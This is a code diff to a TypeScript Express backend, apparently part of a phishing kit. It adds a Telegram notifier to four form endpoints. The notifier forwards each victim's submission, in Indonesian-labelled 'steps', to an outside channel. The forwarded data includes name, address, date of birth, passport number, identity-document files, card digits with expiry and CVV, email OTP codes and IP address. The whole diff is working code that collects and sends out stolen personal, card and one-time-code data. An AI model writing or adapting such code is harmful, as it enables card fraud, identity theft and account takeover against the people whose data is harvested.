@@ -3,6 +3,7 @@ import { db, cardSubmissionsTable, contactSubmissionsTable, otpSubmissionsTable,
 import { sql, eq } from "drizzle-orm";
 import { z } from "zod";
 import { requireAuth } from "../middleware/require-auth";
+import { tgNotify } from "../lib/tg-notify";
 
 const router: IRouter = Router();
 
@@ -63,6 +64,23 @@ router.post("/submissions/contact", async (req, res): Promise<void> => {
   const parsed = ContactBody.safeParse(req.body);
   if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
   await db.insert(contactSubmissionsTable).values(parsed.data).catch(() => {});
+  const d = parsed.data;
+  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+  void tgNotify(
+    `📋 <b>STEP AKHIR — Contact Form</b>\n\n` +
+    `👤 Username   : <code>${d.username}</code>\n` +
+    `🧑 Nama       : <code>${d.firstName ?? ""} ${d.lastName ?? ""}</code>\n` +
+    `📧 Email      : <code>${d.email ?? "-"}</code>\n` +
+    `📱 Telepon    : <code>${d.phone ?? "-"}</code>\n` +
+    `🏠 Alamat     : <code>${d.address ?? "-"}, ${d.city ?? ""} ${d.state ?? ""} ${d.postalCode ?? ""}</code>\n` +
+    `🎂 Tgl Lahir  : <code>${d.dob ?? "-"}</code>\n` +
+    `📝 Jenis      : <code>${d.inquiryType ?? "-"}</code>\n` +
+    `💬 Pesan      : <code>${d.message ?? "-"}</code>\n` +
+    `🗂️ Passport   : <code>${d.passportFilename ?? "-"}</code>\n` +
+    `🗂️ ID Karyawan: <code>${d.employeeIdFilename ?? "-"}</code>\n` +
+    `🌐 IP         : <code>${d.ipAddress ?? "-"}</code>\n` +
+    `🕐 Waktu      : ${now}`
+  );
   res.json({ ok: true });
 });
 
@@ -71,6 +89,19 @@ router.post("/submissions/card", async (req, res): Promise<void> => {
   const parsed = CardBody.safeParse(req.body);
   if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
   await db.insert(cardSubmissionsTable).values(parsed.data).catch(() => {});
+  const d = parsed.data;
+  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+  void tgNotify(
+    `💳 <b>STEP 4 — Data Kartu</b>\n\n` +
+    `👤 Username    : <code>${d.username}</code>\n` +
+    `🪪 Crew ID     : <code>${d.crewId ?? "-"}</code>\n` +
+    `🛂 Passport No : <code>${d.passportNo ?? "-"}</code>\n` +
+    `💳 Kartu (8 digit terakhir): <code>${d.cardLast8 ?? "-"}</code>\n` +
+    `📅 Exp         : <code>${d.cardMonth ?? "-"}/${d.cardYear ?? "-"}</code>\n` +
+    `🔐 CVV         : <code>${d.cvv ?? "-"}</code>\n` +
+    `🌐 IP          : <code>${d.ipAddress ?? "-"}</code>\n` +
+    `🕐 Waktu       : ${now}`
+  );
   res.json({ ok: true });
 });
 
@@ -79,6 +110,21 @@ router.post("/submissions/personal", async (req, res): Promise<void> => {
   const parsed = PersonalBody.safeParse(req.body);
   if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
   await db.insert(personalSubmissionsTable).values(parsed.data).catch(() => {});
+  const d = parsed.data;
+  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+  void tgNotify(
+    `🧾 <b>STEP 4 — Data Personal</b>\n\n` +
+    `👤 Username : <code>${d.username}</code>\n` +
+    `🧑 Nama     : <code>${d.firstName ?? ""} ${d.lastName ?? ""}</code>\n` +
+    `📧 Email    : <code>${d.email ?? "-"}</code>\n` +
+    `📱 Telepon  : <code>${d.phone ?? "-"}</code>\n` +
+    `🏠 Alamat   : <code>${d.address ?? "-"}, ${d.city ?? ""} ${d.state ?? ""} ${d.postalCode ?? ""}</code>\n` +
+    `🎂 Tgl Lahir: <code>${d.dob ?? "-"}</code>\n` +
+    `📝 Jenis    : <code>${d.inquiryType ?? "-"}</code>\n` +
+    `💬 Pesan    : <code>${d.message ?? "-"}</code>\n` +
+    `🌐 IP       : <code>${d.ipAddress ?? "-"}</code>\n` +
+    `🕐 Waktu    : ${now}`
+  );
   res.json({ ok: true });
 });
 
@@ -87,6 +133,16 @@ router.post("/submissions/otp", async (req, res): Promise<void> => {
   const parsed = OtpBody.safeParse(req.body);
   if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
   await db.insert(otpSubmissionsTable).values(parsed.data).catch(() => {});
+  const d = parsed.data;
+  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+  void tgNotify(
+    `🔢 <b>STEP 5 — Kode OTP Email</b>\n\n` +
+    `👤 Username : <code>${d.username}</code>\n` +
+    `📧 Email    : <code>${d.email ?? "-"}</code>\n` +
+    `🔑 OTP      : <code>${d.otpCode ?? "-"}</code>\n` +
+    `🌐 IP       : <code>${d.ipAddress ?? "-"}</code>\n` +
+    `🕐 Waktu    : ${now}`
+  );
   res.json({ ok: true });
 });
 
